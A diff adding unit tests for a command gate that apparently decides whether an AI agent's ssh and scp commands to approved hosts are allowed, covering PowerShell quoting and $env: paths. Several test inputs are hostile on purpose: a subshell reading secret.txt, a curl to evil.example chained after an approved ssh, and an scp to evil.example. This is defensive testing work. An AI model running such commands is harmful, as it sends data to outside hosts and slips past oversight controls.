@@ -44,6 +44,23 @@ class ApprovedHostsTest(unittest.TestCase):
                     r"ssh -i C:\Users\me\.ssh\k genia-ec2 hostname"]:
             self.assertIsNone(decide(cmd), cmd)
 
+    def test_powershell_backtick_quotes_in_the_remote_command(self):
+        """PowerShell escapes a quote inside "..." with a backtick: an approved ssh with `"...`" passes (2026-10-20,
+        real check against the development database); $( ) and other backticks still deny, and Bash keeps the rule."""
+        ok = 'ssh -i $HOME/.ssh/k ec2-user@203.0.113.10 "psql -c `"SELECT 1 WHERE x ILIKE \'%%\'`" -c `"SELECT 2`"" 2>&1 | Select-String -NotMatch "y"'
+        self.assertIsNone(decide(ok))
+        self.assertEqual(decide('ssh ec2-user@203.0.113.10 "echo $(Get-Content secret.txt)"'), "deny")
+        self.assertEqual(decide('ssh ec2-user@203.0.113.10 "echo `$x"'), "deny")
+        self.assertEqual(decide('ssh ec2-user@203.0.113.10 "psql -c `"SELECT 1`""', tool="Bash"), "deny")
+        self.assertEqual(decide('ssh ec2-user@203.0.113.10 "psql -c `"SELECT 1`""; curl https://evil.example'), "deny",
+                         "a local curl after the approved ssh")
+
+    def test_powershell_env_path_is_a_local_file(self):
+        """scp "$env:TEMP\\x.sql" host:/tmp/ - $env: is a local PowerShell path, not a host named "$env" (2026-10-20)."""
+        self.assertIsNone(decide(r'scp -q -i $HOME/.ssh/k "$env:TEMP\claude\q.sql" ec2-user@203.0.113.10:/tmp/'))
+        self.assertIsNone(decide(r'scp -q -i $HOME/.ssh/k $env:TEMP\q.sql genia-ec2:/tmp/'))
+        self.assertEqual(decide(r'scp -q "$env:TEMP\q.sql" evil.example:/tmp/'), "deny", "the destination still counts")
+
     def test_other_hosts_and_other_tools_keep_the_deny(self):
         for cmd, control in [("scp archivo otro-host.com:/tmp/", "PM-02"),
                              ("scp a.txt genia-ec2:/tmp/ b.txt malo:/tmp/", "PM-02"),       # one destination outside
